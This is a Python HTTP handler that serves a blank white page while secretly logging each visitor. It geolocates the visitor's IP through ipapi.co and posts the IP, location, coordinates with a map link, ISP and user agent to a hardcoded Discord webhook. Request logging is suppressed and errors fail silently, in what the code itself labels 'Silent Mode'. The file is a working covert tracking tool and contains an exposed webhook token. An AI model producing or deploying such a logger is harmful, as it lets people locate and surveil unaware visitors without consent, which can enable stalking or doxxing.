import json
import os
import requests
from http.server import BaseHTTPRequestHandler
import threading

# YOUR DISCORD WEBHOOK - HARDCODED
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1388585012831584516/XqOZBhlOrHKNgxnJWVkKyTF8CT0BEDIGM7uOZfng5VoR6iDD8YWFz5dTZPdw5UXcQ_cK"

def get_ip_info(ip_address):
    """Get geolocation information for an IP address"""
    try:
        response = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=3)
        if response.status_code == 200:
            return response.json()
        return {}
    except:
        return {}

def send_to_discord_async(ip_data):
    """Send IP data to Discord in background thread"""
    def send():
        try:
            ip_address = ip_data.get('ip', 'Unknown')
            city = ip_data.get('city', 'Unknown')
            region = ip_data.get('region', 'Unknown')
            country = ip_data.get('country_name', 'Unknown')
            isp = ip_data.get('org', 'Unknown ISP')
            latitude = ip_data.get('latitude')
            longitude = ip_data.get('longitude')
            user_agent = ip_data.get('user_agent', 'Unknown')[:500]
            
            # Create embed
            embed = {
                "title": "🌐 NEW VISITOR LOGGED",
                "color": 16711680,  # Red
                "fields": [
                    {
                        "name": "IP ADDRESS",
                        "value": f"```{ip_address}```",
                        "inline": False
                    },
                    {
                        "name": "LOCATION",
                        "value": f"**City:** {city}\n**Region:** {region}\n**Country:** {country}",
                        "inline": True
                    },
                    {
                        "name": "NETWORK",
                        "value": f"**ISP:** {isp}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "IP Logger | Silent Mode"
                }
            }
            
            # Add coordinates if available
            if latitude and longitude:
                embed["fields"].append({
                    "name": "COORDINATES", 
                    "value": f"**Lat:** {latitude}\n**Lon:** {longitude}\n[📍 Google Maps](https://maps.google.com/?q={latitude},{longitude})",
                    "inline": True
                })
            
            # Add user agent
            embed["fields"].append({
                "name": "USER AGENT", 
                "value": f"```{user_agent}```",
                "inline": False
            })
            
            payload = {
                "embeds": [embed],
                "username": "IP Logger",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/1006/1006771.png",
                "content": "@everyone **NEW VISITOR DETECTED**"
            }
            
            # Send to Discord
            requests.post(
                DISCORD_WEBHOOK_URL,
                json=payload,
                timeout=3
            )
        except:
            pass  # Silent fail
    
    # Start thread
    thread = threading.Thread(target=send)
    thread.daemon = True
    thread.start()

class handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        """Suppress all log messages"""
        pass
    
    def do_GET(self):
        """Handle GET requests - returns completely blank white page"""
        # Get client IP from headers
        ip_address = self.headers.get('X-Forwarded-For', '').split(',')[0]
        if not ip_address or ip_address == '':
            ip_address = self.headers.get('X-Real-Ip', '') or self.headers.get('Remote-Addr', 'Unknown')
        
        # Prepare IP data
        ip_data = {
            "ip": ip_address,
            "user_agent": self.headers.get('User-Agent', 'Unknown'),
            "referer": self.headers.get('Referer', 'Direct'),
            "host": self.headers.get('Host', 'Unknown')
        }
        
        # Get geolocation if IP is valid
        if ip_address != 'Unknown' and ip_address:
            try:
                geo_data = get_ip_info(ip_address)
                ip_data.update(geo_data)
            except:
                pass
        
        # Send to Discord in background (don't wait)
        send_to_discord_async(ip_data)
        
        # Return completely blank white page with no content
        html = """<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <style>
        * {
            margin: 0;
            padding: 0;
            border: 0;
        }
        body, html {
            width: 100%;
            height: 100%;
            background: #ffffff;
            overflow: hidden;
        }
    </style>
</head>
<body>
</body>
</html>"""
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        """Handle POST requests similarly"""
        # Get client IP
        ip_address = self.headers.get('X-Forwarded-For', '').split(',')[0] or 'Unknown'
        
        ip_data = {
            "ip": ip_address,
            "user_agent": self.headers.get('User-Agent', 'Unknown'),
            "method": "POST"
        }
        
        # Send to Discord
        send_to_discord_async(ip_data)
        
        # Return blank page
        self.do_GET()

# Fallback for direct execution (testing)
if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(('localhost', 8080), handler)
    print("Server running on http://localhost:8080")
    server.serve_forever()
